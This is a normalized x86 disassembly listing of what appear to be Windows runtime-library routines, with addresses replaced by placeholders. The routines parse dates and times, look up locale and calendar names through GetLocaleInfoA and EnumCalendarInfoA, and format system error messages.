mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40957c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40957c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098dc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098dc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40957c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4083a4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409518
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098dc
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409518
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409518
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40955c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4094dc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40955c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4083a4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409518
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409518
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40955c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4094dc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40955c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40bda4
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4083a4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409518
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098dc
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40957c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4083a4
test eax eax
jne r-xdata
push ebp
call sub_4095f4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4094dc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40955c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40955c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40955c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40bda4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098dc
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409518
pop ecx
jmp r-xdata
push ebp
call sub_4095f4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4094dc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40955c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4083a4
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4083a4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4083a4
test eax eax
jne r-xdata
jmp r-xdata
sub_40a090
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_4098dc
pop ecx
push ebp
mov eax ebx
call sub_4098dc
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403f9c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a100
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40416c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a124
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a100
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40416c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a1b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a231
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a238
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a100
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40416c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4043cc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407b0c
test eax eax
jne r-xdata
mov eax edi
call sub_40416c
add [ esi ] eax
mov bl 0x1
sub_40a244
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a100
mov eax esi
call sub_40416c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a27c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40416c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a2c8
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40416c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40bde8
mov [ ebx ] eax
jmp r-xdata
sub_40a310
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40436c
push eax
mov eax [ ebx ]
call sub_40436c
pop edx
call sub_40bed0
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a364
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409504
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a3c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a6db
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a27c
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40be98
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a124
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a2c8
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4043cc
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407b7c
mov eax [ ebp - 0x1c ]
call sub_40a310
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a6e2
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403ed0
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a244
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a124
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a244
test al al
je r-xdata
call sub_409504
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a124
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4092a8
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044b0
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a244
mov edx ebx
mov eax esi
call sub_40a100
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40416c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a2c8
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a364
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a100
mov eax esi
call sub_40416c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409504
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40416c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043cc
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407b0c
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40416c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043cc
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407b0c
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a704
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a1b8
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a1b8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a1b8
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a124
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a100
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a1b8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a244
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a124
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a1b8
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a244
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a100
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4091a0
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a1b8
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a124
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a1b8
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a244
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a1b8
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a124
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40a8f8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a704
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40416c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40a92c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a3c0
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40a8f8
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40416c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a704
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40a9b8
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403f9c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40aa04
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f00
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403f9c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40aa50
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40aa78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40aa04
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_4059ac
sub_40aab4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40abc7
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40aa78
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f00
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40aa78
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f00
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40aa78
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f00
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40aa78
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f00
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40abce
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403ed0
retn
sub_40abd8
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4040a4
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ac14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40ac79
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040a4
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_407df4
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ac80
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
inc ebx
sub_40ac8c
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40ad23
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40aa04
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_407df4
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad2a
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40abd8
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ac14
call EnumCalendarInfoA
sub_40ad3c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40af06
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403eac
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40aa04
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_407df4
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40416c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af0d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403ed0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4083a4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bdac
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4043cc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404174
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f00
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4083a4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
inc ebx
jmp r-xdata
mov eax esi
call sub_40416c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4083a4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
